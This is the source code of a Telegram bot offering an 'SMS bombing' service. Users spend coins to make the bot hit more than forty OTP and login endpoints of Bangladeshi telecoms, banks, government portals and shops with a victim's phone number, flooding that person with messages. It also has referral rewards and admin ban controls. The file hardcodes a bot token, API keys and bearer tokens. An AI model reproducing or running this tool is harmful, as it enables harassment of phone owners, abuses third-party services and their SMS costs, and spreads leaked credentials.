const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Setup
const DB_USERS = './users.json';
const DB_HISTORY = './history.json';
const DB_RESTRICTED = './restricted.json';

let userData = fs.existsSync(DB_USERS) ? JSON.parse(fs.readFileSync(DB_USERS)) : {};
let historyData = fs.existsSync(DB_HISTORY) ? JSON.parse(fs.readFileSync(DB_HISTORY)) : [];
let restrictedNumbers = fs.existsSync(DB_RESTRICTED) ? JSON.parse(fs.readFileSync(DB_RESTRICTED)) : [];

function saveData() {
    fs.writeFileSync(DB_USERS, JSON.stringify(userData, null, 2));
    fs.writeFileSync(DB_HISTORY, JSON.stringify(historyData, null, 2));
    fs.writeFileSync(DB_RESTRICTED, JSON.stringify(restrictedNumbers, null, 2));
}

// Render dummy server
const app = express();
app.get('/', (req, res) => res.send('Bot Status: Online'));
app.listen(process.env.PORT || 3000);

// API List (Same as before)
const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

// Helper: Auto-delete
async function autoDelete(ctx, msgId, delay = 300000) { // 5 mins for admin commands
    setTimeout(async () => {
        try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
    }, delay);
}

// User registration & Ban Check
async function checkUser(ctx) {
    const uid = ctx.from.id;
    if (!userData[uid]) {
        userData[uid] = { 
            coins: 50, 
            lastBonus: 0, 
            username: ctx.from.username || "User", 
            totalReq: 0, 
            isBanned: false,
            bannedUntil: 0
        };
        saveData();
    }
    
    if (userData[uid].isBanned) {
        if (userData[uid].bannedUntil > 0 && Date.now() > userData[uid].bannedUntil) {
            userData[uid].isBanned = false;
            saveData();
        } else {
            ctx.reply("❌ আপনি ব্যান আছেন!");
            return false;
        }
    }
    return true;
}

// Keyboards
const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info'],
    ['📜 History']
]).resize();

const adminMenu = Markup.inlineKeyboard([
    [Markup.button.callback('📢 Broadcast', 'admin_bc'), Markup.button.callback('👥 User List', 'admin_users')]
]);

// Referral Logic
bot.start(async (ctx) => {
    if (!await checkUser(ctx)) return;
    const uid = ctx.from.id;
    const refId = ctx.startPayload;

    if (refId && refId != uid && userData[refId] && !userData[uid].referredBy) {
        userData[uid].referredBy = refId;
        userData[refId].coins += 100;
        ctx.reply(`🎉 আপনি একজনের রেফারে জয়েন করেছেন!`);
        bot.telegram.sendMessage(refId, `🎊 আপনার রেফারে একজন জয়েন করেছে! ১০০ পয়েন্ট বোনাস পেয়েছেন।`);
    }

    ctx.reply(`👋 স্বাগতম!\nআপনার UID: <code>${uid}</code>`, { parse_mode: 'HTML', ...mainMenu });
});

// Help Command
bot.command('help', async (ctx) => {
    let helpText = `📖 **কমান্ড লিস্ট:**\n/start - শুরু করুন\n/bm <নম্বর> <পরিমাণ> - বোম্বিং\n/balance - ব্যালেন্স\n/history - হিস্টোরি\n/ck - বোনাস\n/info - তথ্য\n\n`;
    if (ctx.from.id === ADMIN_ID) {
        helpText += `👤 **অ্যাডমিন কমান্ড:**\n/recharge <uid> <amount>\n/list user - ইউজার লিস্ট\n/ban <uid> <দিন>\n/uban <uid> - আনব্যান\n/rn <নম্বর> - রেস্ট্রিক্ট\n/list rn - নিষিদ্ধ তালিকা\n/bc - ব্রডকাস্ট`;
    }
    const msg = await ctx.reply(helpText, { parse_mode: 'Markdown' });
    autoDelete(ctx, msg.message_id);
});

// Admin: Manage Users
bot.command('list', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    if (args[1] === 'user') {
        let list = "👥 **User List:**\n";
        Object.keys(userData).slice(-15).forEach(id => {
            list += `👤 @${userData[id].username} | 🆔 <code>${id}</code> | 💰 ${userData[id].coins} | 🔢 ${userData[id].totalReq}\n`;
        });
        const msg = await ctx.reply(list, { parse_mode: 'HTML' });
        autoDelete(ctx, msg.message_id);
    } else if (args[1] === 'rn') {
        ctx.reply(`🚫 নিষিদ্ধ নম্বর: ${restrictedNumbers.join(', ') || 'নেই'}`);
    }
});

bot.command('ban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1];
    const days = parseInt(args[2]) || 0;
    if (userData[target]) {
        userData[target].isBanned = true;
        userData[target].bannedUntil = days > 0 ? Date.now() + (days * 24 * 60 * 60 * 1000) : 0;
        saveData();
        ctx.reply(`✅ User ${target} Banned.`);
    }
});

bot.command('uban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const target = ctx.message.text.split(' ')[1];
    if (userData[target]) {
        userData[target].isBanned = false;
        saveData();
        ctx.reply(`✅ User ${target} Unbanned.`);
    }
});

// Admin: Restricted Numbers
bot.command('rn', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const num = ctx.message.text.split(' ')[1];
    if (!num) return;
    if (num.startsWith('-')) {
        const cleanNum = num.substring(1);
        restrictedNumbers = restrictedNumbers.filter(n => n !== cleanNum);
        ctx.reply(`✅ ${cleanNum} রিমুভ হয়েছে।`);
    } else {
        restrictedNumbers.push(num);
        ctx.reply(`✅ ${num} নিষিদ্ধ করা হয়েছে।`);
    }
    saveData();
});

// History Logic
bot.hears('📜 History', async (ctx) => {
    if (!await checkUser(ctx)) return;
    const uid = ctx.from.id;
    let history;
    if (uid === ADMIN_ID) {
        history = historyData.slice(-10);
    } else {
        history = historyData.filter(h => h.uid === uid).slice(-10);
    }

    let text = "📜 **History:**\n";
    history.forEach(h => {
        text += `📱 ${h.phone} | 🔢 ${h.amount} | 📅 ${new Date(h.time).toLocaleTimeString()}\n`;
    });
    ctx.reply(text || "কোনো হিস্টোরি নেই।", { parse_mode: 'Markdown' });
});

// Daily Bonus & Referral
bot.hears('🎁 Daily Bonus', async (ctx) => {
    if (!await checkUser(ctx)) return;
    const uid = ctx.from.id;
    const diff = (Date.now() - userData[uid].lastBonus) / (1000 * 60 * 60);
    if (diff >= 24) {
        userData[uid].coins += 50;
        userData[uid].lastBonus = Date.now();
        saveData();
        const refLink = `https://t.me/gemini_imgRobot?start=${uid}`; // আপনার বটের ইউজারনেম এখানে দিন
        ctx.reply(`✅ ৫০ কয়েন বোনাস পেয়েছেন!\n\n🔗 আপনার রেফার লিংক:\n<code>${refLink}</code>\n(প্রতি রেফারে ১০০ কয়েন পাবেন)`, { parse_mode: 'HTML' });
    } else {
        ctx.reply(`❌ আপনি বোনাস নিয়েছেন। আবার ${(24 - diff).toFixed(1)} ঘণ্টা পর।`);
    }
});

// Admin: Recharge
bot.command('recharge', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1];
    const amount = parseInt(args[2]);
    if (userData[target]) {
        userData[target].coins += amount;
        saveData();
        ctx.reply(`✅ ${target} এর ব্যালেন্স আপডেট হয়েছে।`);
    }
});

// Admin: Broadcast
bot.command('bc', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.session = { step: 'bc_msg' };
    ctx.reply("📢 ব্রডকাস্ট মেসেজ দিন (ছবি সহ দিতে পারেন):");
});

// SMS Bombing with Blacklist Check
async function startBombing(ctx, phone, amount) {
    if (!await checkUser(ctx)) return;
    const uid = ctx.from.id;

    if (restrictedNumbers.includes(phone)) {
        return ctx.reply("❌ এই নম্বরটি নিষিদ্ধ তালিকায় আছে!");
    }

    if (userData[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");

    const statusMsg = await ctx.reply(`🚀 কাজ শুরু হয়েছে (${phone})...`);
    
    let success = 0;
    let apiIdx = 0;

    // Fast bombing logic
    while (success < amount) {
        const api = SMS_APIS[apiIdx % SMS_APIS.length];
        apiIdx++;
        try {
            const config = { method: api.method, url: api.url, timeout: 4000 };
            if (api.method === 'POST') config.data = api.data(phone);
            else config.params = api.params(phone);
            await axios(config);
            success++;
        } catch (e) {}
        await new Promise(r => setTimeout(r, 100));
        if (apiIdx > amount + 500) break;
    }

    userData[uid].coins -= amount;
    userData[uid].totalReq += 1;
    historyData.push({ uid, phone, amount, time: Date.now() });
    saveData();

    ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n💰 ব্যালেন্স: ${userData[uid].coins}`, mainMenu);
}

// Global Text/Step Handler
bot.on(['text', 'photo'], async (ctx) => {
    const uid = ctx.from.id;
    if (ctx.session?.step === 'bc_msg') {
        const users = Object.keys(userData);
        users.forEach(id => {
            if (ctx.message.photo) {
                bot.telegram.sendPhoto(id, ctx.message.photo[0].file_id, { caption: ctx.message.caption });
            } else {
                bot.telegram.sendMessage(id, ctx.message.text);
            }
        });
        ctx.reply("📢 ব্রডকাস্ট সম্পন্ন!");
        ctx.session = {};
    } else if (ctx.session?.step === 'get_phone') {
        ctx.session.phone = ctx.message.text;
        ctx.session.step = 'get_amount';
        ctx.reply("🔢 পরিমাণ:");
    } else if (ctx.session?.step === 'get_amount') {
        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
        ctx.session = {};
    }
});

bot.hears('🚀 Boom', (ctx) => {
    ctx.session = { step: 'get_phone' };
    ctx.reply("📱 নম্বর দিন:");
});

bot.hears('💰 Balance', async (ctx) => {
    if (!await checkUser(ctx)) return;
    ctx.reply(`💰 ব্যালেন্স: ${userData[ctx.from.id].coins} কয়েন`);
});

bot.hears('ℹ️ Info', async (ctx) => {
    if (!await checkUser(ctx)) return;
    ctx.reply(`🆔 UID: <code>${ctx.from.id}</code>\n👤 Admin: @Tnayem48`, { parse_mode: 'HTML' });
});

bot.launch().then(() => console.log("Bot Online!"));
